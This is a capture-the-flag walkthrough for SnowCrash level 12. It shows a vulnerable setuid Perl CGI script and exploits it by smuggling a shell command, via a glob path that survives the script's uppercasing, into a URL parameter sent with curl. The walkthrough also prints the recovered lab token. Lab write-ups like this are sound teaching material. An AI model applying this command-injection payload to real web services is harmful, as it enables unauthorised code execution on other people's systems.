# SnowCrash Level12 Guide
This guide will walk you through the process of finding the password for the `flag12` user.

## Procedure:

1. **Examine your environment**
   
`ls -la` : Lists files and their permissions in the current directory.
```bash
-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
```
We have a Perl script.

2. **Analyze level12.pl**

We have Perl installed on the VM.
We execute the script.
```bash
perl level12.pl
```
Returns
```bash
Content-type: text/html

..
```

We can read the content of the file.
```bash
cat level12.pl
```
Returns
```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```
This script seems to be a web server, which returns a HTML response.
It takes two parameters `x` and `y` and calls the function `t` with these parameters.
```perl
sub t {
  $nn = $_[1]; # y
  $xx = $_[0]; # x
  $xx =~ tr/a-z/A-Z/; # uppercase
  $xx =~ s/\s.*//; # remove spaces
  @output = `egrep "^$xx" /tmp/xd 2>&1`; # search for lines starting (`^`) with $xx in /tmp/xd
  # `2>&1` redirects stderr to stdout
  # so all output is stored in @output
  foreach $line (@output) { # iterate over each line in @output
      ($f, $s) = split(/:/, $line); # split the line by `:`
      if($s =~ $nn) { # check if the second part of the line contains the second parameter
          return 1;
      }
  }
  return 0;
}
```
The function `t` searches for lines in `/tmp/xd` that start with the first parameter in uppercase and checks if the second parameter is in the second part of the line.
`/tmp/xd` does not exist.

We can't directly use the first argument because it is converted to uppercase.
`getflag>/tmp/flag` will be converted to `GETFLAG>/TMP/FLAG`.
But we can write a file that will be read by the script.

3. **Create a file to get the flag**

We can create a file and make it run the `getflag` command.

```bash
echo -e '#!/bin/bash\ngetflag > /tmp/flag12.txt' > /tmp/GETFLAG12
```
Then give the file execution permissions.
```bash
chmod +x GETFLAG12
```

In the script we can read `# localhost:4646` in comments.
We can assume that the script is running on port 4646.
We can use `curl` to send a request to the server, with the first parameter being the path to the file we just created.
```bash
curl 'http://localhost:4646?x=$(/*/GETFLAG12)'
```
We check `/tmp/flag12.txt` to see if the flag was written.
```bash
cat /tmp/flag12.txt
```
Returns
```bash
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

Log as the next user.